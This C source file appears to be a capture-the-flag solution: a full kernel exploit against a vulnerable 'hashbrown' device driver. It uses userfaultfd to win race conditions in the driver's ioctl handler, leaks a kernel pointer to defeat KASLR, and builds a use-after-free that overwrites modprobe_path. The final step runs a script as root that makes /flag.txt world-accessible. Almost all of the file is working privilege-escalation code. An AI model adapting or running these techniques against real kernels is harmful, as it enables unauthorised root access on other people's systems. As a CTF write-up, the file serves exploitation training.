#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <poll.h>
#include <assert.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <linux/userfaultfd.h>

#define UFFDIO_API 0xc018aa3f
#define UFFDIO_REGISTER 0xc020aa00
#define UFFDIO_UNREGISTER 0x8010aa01
#define UFFDIO_COPY 0xc028aa03
#define UFFDIO_ZEROPAGE 0xc020aa04
#define UFFDIO_WAKE 0x8010aa02

#define ADD_KEY 0x1337
#define DELETE_KEY 0x1338
#define UPDATE_VALUE 0x1339
#define DELETE_VALUE 0x133a
#define GET_VALUE 0x133b

pthread_t thread;
uint64_t race_page;
static void (*race_function)();
int target_idx;
uint64_t kbase, shmem_vm_ops, modprobe_path;
int fd;

typedef struct
{
    uint32_t key;
    uint32_t size;
    char *src;
    char *dest;
}request_t;

long ioctl(int fd, unsigned long request, unsigned long param)
{
    return syscall(16, fd, request, param);
}

long add_key(int fd, uint32_t key, uint32_t size, char *src)
{
    request_t request;
    request.key = key;
    request.size = size;
    request.src = src;

    return ioctl(fd, ADD_KEY, (unsigned long)&request);
}

long delete_key(int fd, uint32_t key)
{
    request_t request;
    request.key = key;

    return ioctl(fd, DELETE_KEY, (unsigned long)&request);
}

long update_value(int fd, uint32_t key, uint32_t size, char *src)
{
    request_t request;
    request.key = key;
    request.size = size;
    request.src = src;

    return ioctl(fd, UPDATE_VALUE, (unsigned long)&request);
}

long delete_value(int fd, uint32_t key)
{
    request_t request;
    request.key = key;

    return ioctl(fd, DELETE_VALUE, (unsigned long)&request);
}

long get_value(int fd, uint32_t key, uint32_t size, char *dest)
{
    request_t request;
    request.key = key;
    request.size = size;
    request.dest = dest;

    return ioctl(fd, GET_VALUE, (unsigned long)&request);
}

void leak_setup()
{
    int shmid; // shm_file_data (kmalloc-32) leak for kernel data leak to rebase kernel with fg kaslr
    char *shmaddr;

    puts("setting up for leak");
    delete_value(fd, target_idx);
    if ((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1)
    {
        perror("shmget error");
        exit(-1);
    }
    shmaddr = shmat(shmid, NULL, 0);
    if (shmaddr == (void*)-1)
    {
        perror("shmat error");
        exit(-1);
    }
    return;
}

void uaf_setup()
{
    puts("setting up uaf");
    delete_value(fd, target_idx);
}

void *racer(void *arg)
{
    struct uffd_msg uf_msg;
    struct uffdio_copy uf_copy;
    struct uffdio_range uf_range;
    long uffd = (long)arg;
    struct pollfd pollfd;
    int nready;

    pollfd.fd = uffd;
    pollfd.events = POLLIN;

    uf_range.start = race_page;
    uf_range.len = 0x1000;

    while(poll(&pollfd, 1, -1) > 0)
    {
        if(pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
        {
            perror("polling error");
            exit(-1);
        }
        if(read(uffd, &uf_msg, sizeof(uf_msg)) == 0)
        {
            perror("error reading event");
            exit(-1);
        }
        if(uf_msg.event != UFFD_EVENT_PAGEFAULT)
        {
            perror("unexpected result from event");
            exit(-1);
        }

        race_function();

        char uf_buffer[0x1000];
        uf_copy.src = (unsigned long)uf_buffer;
        uf_copy.dst = race_page;
        uf_copy.len = 0x1000;
        uf_copy.mode = 0;
        uf_copy.copy = 0;
        if(ioctl(uffd, UFFDIO_COPY, (unsigned long)&uf_copy) == -1)
        {
            perror("uffdio_copy error");
            exit(-1);
        }
        if (ioctl(uffd, UFFDIO_UNREGISTER, (unsigned long)&uf_range) == -1)
        {
            perror("error unregistering page for userfaultfd");
        }
        if (munmap((void *)race_page, 0x1000) == -1)
        {
            perror("error on munmapping race page");
        }
        return 0;
    }
    return 0;
}

void register_userfault()
{
    int uffd, race;
    struct uffdio_api uf_api;
    struct uffdio_register uf_register;

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    uf_api.api = UFFD_API;
    uf_api.features = 0;

    if (ioctl(uffd, UFFDIO_API, (unsigned long)&uf_api) == -1)
    {
        perror("error with the uffdio_api");
        exit(-1);
    }

    if (mmap((void *)race_page, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0) != (void *)race_page)
    {
        perror("whoopsie doopsie on mmap");
        exit(-1);
    }

    uf_register.range.start = race_page;
    uf_register.range.len = 0x1000;
    uf_register.mode = UFFDIO_REGISTER_MODE_MISSING;

    if (ioctl(uffd, UFFDIO_REGISTER, (unsigned long)&uf_register) == -1)
    {
        perror("error registering page for userfaultfd");
    }

    race = pthread_create(&thread, NULL, racer, (void*)(long)uffd);
    if(race != 0)
    {
        perror("can't setup threads for race");
    }
    return;
}

void modprobe_hax()
{
    char filename[65];
    memset(filename, 0, sizeof(filename));
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/ctf/roooot");
    system("chmod +x /home/ctf/roooot");
    system("echo -ne '#!/bin/sh\nchmod 777 /flag.txt' > /home/ctf/w\n");
    system("chmod +x /home/ctf/w");
    system("/home/ctf/roooot");
    return;
}

int main(int argc, char **argv, char **envp)
{
    // bug is two mutexes used (one for resize, one for all other operatios) -> allows for race conditions in ioctl handler
    fd = open("/dev/hashbrown", O_RDONLY);

    for (int i = 0; i < 0x50; i++)
    {
        open("/proc/self/stat", O_RDONLY);
    }

    char buf[0xb0];
    char smallbuf[0x20];
    int uaf_entry;
    request_t evil;

    // going for leaks
    add_key(fd, 0, sizeof(smallbuf), smallbuf);
    for (int i = 1; i < 12; i++)
    {
        memset(buf, 0x41 + i, sizeof(buf));
        add_key(fd, i, sizeof(buf), buf);
    }
    race_page = 0xbaad0000;
    race_function = &leak_setup;
    target_idx = 0;
    // using classic uffd technique for race
    register_userfault();

    add_key(fd, 27, sizeof(buf), (char *)race_page);
    pthread_join(thread, NULL);

    get_value(fd, 0, sizeof(smallbuf), smallbuf);

    memcpy((void *)&shmem_vm_ops, (void *)&(smallbuf[0x18]), 0x8);
    kbase = shmem_vm_ops - 0x822b80;
    modprobe_path = kbase + 0xa46fe0;

    // fg-kaslr doesn't affect some of the earlier functions in .text, nor functions not in C or data, etc.
    printf("leaked shmem_vm_ops: 0x%llx\n", shmem_vm_ops);
    printf("kernel base: 0x%llx\n", kbase);
    printf("modprobe_path: 0x%llx\n", modprobe_path);

    // clean up
    for (int i = 1; i < 12; i++)
    {
        delete_key(fd, i);
    }
    delete_key(fd, 27);

    // set up for second race
    for (int i = 1; i <= 22; i++)
    {
        add_key(fd, i, sizeof(buf), buf);
    }
    add_key(fd, 1337, sizeof(smallbuf), smallbuf);

    race_page = 0xf00d0000;
    race_function = &uaf_setup;
    target_idx = 1337;

    register_userfault();

    add_key(fd, 23, 0x20, (char *)0xf00d0000);
    pthread_join(thread, NULL);

    // retrieval is somewhat deterministic, shuffling only happens when new slab is applied for?
    for (int i = 24; i < 0x400; i++)
    {
        add_key(fd, i, sizeof(buf), buf);
    }
    get_value(fd, target_idx, sizeof(smallbuf), smallbuf);
    uaf_entry = *(int *)smallbuf;
    printf("uaf'd entry: %d\n", uaf_entry);

    // clean up
    for (int i = 1; i < 0x400; i++)
    {
        if (i != uaf_entry)
        {
            delete_key(fd, i);
        }
    }

    // evil hash entry
    evil.key = uaf_entry;
    evil.size = 0x20;
    evil.src = (char *)modprobe_path;
    evil.dest = NULL;

    memset(smallbuf, 0, sizeof(smallbuf));
    memcpy(smallbuf, (void *)&evil, sizeof(evil));
    update_value(fd, target_idx, sizeof(smallbuf), smallbuf);
    memset(smallbuf, 0, sizeof(smallbuf));
    strcpy(smallbuf, "/home/ctf/w");
    update_value(fd, uaf_entry, sizeof(smallbuf), smallbuf);
    modprobe_hax();
}